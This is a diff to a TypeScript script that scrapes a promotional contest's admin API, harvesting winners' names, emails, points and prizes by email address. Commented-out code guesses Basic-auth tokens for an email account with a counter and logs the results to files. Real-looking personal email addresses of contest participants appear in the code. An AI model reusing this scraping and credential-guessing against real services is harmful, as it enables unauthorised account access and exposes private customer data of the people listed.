@@ -62,16 +62,16 @@ function randomBetween(start, end) {
 
 (async () => {
   const values = {};
-  const request = new CustomRequest({}, true);
-  const res = await request.get("https://adm.dirolpromo.ru/api/winners?query=&date=2019-06-02&page=1&count=20").catch(value => <any>console.log(value));
+  const request = new CustomRequest({}, false);
+  // const res = await request.get("https://adm.dirolpromo.ru/api/winners?query=&date=2019-06-02&page=1&count=20").catch(value => <any>console.log(value));
   // const res = await request.get("https://adm.dirolpromo.ru/api/winners?count=100000").catch(value => <any>console.log(value));
   // const res = await request.get("https://adm.dirolpromo.ru/api/winners?count=100&page=4").catch(value => <any>console.log(value));
-  const data = res.data;
+  // const data = res.data;
 
-  for (let value of data) {
-    if (!value.client) { continue; }
-    values[value.client.email] = value.client;
-  }
+  // for (let value of data) {
+  //   if (!value.client) { continue; }
+  //   values[value.client.email] = value.client;
+  // }
 
   // for (let i = 1000; i < 10000; ++i) {
   //   let token = Buffer.from('sergeicykalo@yanex.ru:123\'').toString('base64');
@@ -91,12 +91,12 @@ function randomBetween(start, end) {
   //
   //   await sleep(1000);
   // }
-  const keys = Object.keys(values);
-  for (let i = 0; i < keys.length; ++i) {
-    const a = await main(request, keys[i]);
-    if (a) { i--; }
-  }
-  // await main(request, 'milashka85_08@mail.ru');
+  // const keys = Object.keys(values);
+  // for (let i = 0; i < keys.length; ++i) {
+  //   const a = await main(request, keys[i]);
+  //   if (a) { i--; }
+  // }
+  await main(request, 'OGureva@flashbox.5july.org');
   //yanayastrebova@mail.ru
   //255857@list.ru
 
@@ -189,9 +189,9 @@ async function main(request: CustomRequest, email) {
     const json = res.data;
     // console.log('3', json)
     if (!json.client) { return true }
-    fetch("http://adm.dirolpromo.ru/api/client/prizes", { headers: { 'Authorization': token } }).then(text => text.json())
-      // .then(value => FS.appendFileSync('cookie/resultPrizes2.txt', `${json.client.email}. Prizes: ${JSON.stringify(value)}` + '\n'));
-      .then(value => console.log(`${json.client.email}. Prizes: ${JSON.stringify(value)}`));
+    // fetch("http://adm.dirolpromo.ru/api/client/prizes", { headers: { 'Authorization': token } }).then(text => text.json())
+    //   .then(value => FS.appendFileSync('cookie/resultPrizes2.txt', `${json.client.email}. Prizes: ${JSON.stringify(value)}` + '\n'));
+      // .then(value => console.log(`${json.client.email}. Prizes: ${JSON.stringify(value)}`));
 
     console.log(`${json.client.name} ${json.client.surname} ${json.client.email}. Points: ${json.client.points}`);
     // FS.appendFileSync('cookie/result22.txt', `${json.client.name} ${json.client.surname} ${json.client.email}. Points: ${json.client.points}` + '\n');
@@ -627,3 +627,6 @@ function getRandomInt(min, max) {
 // //     (await fetch(`http://crierbot.appspot.com/${token}/send?message=${encodeURIComponent(arr[i])}`));
 // //   }
 // // })();
+
+
+
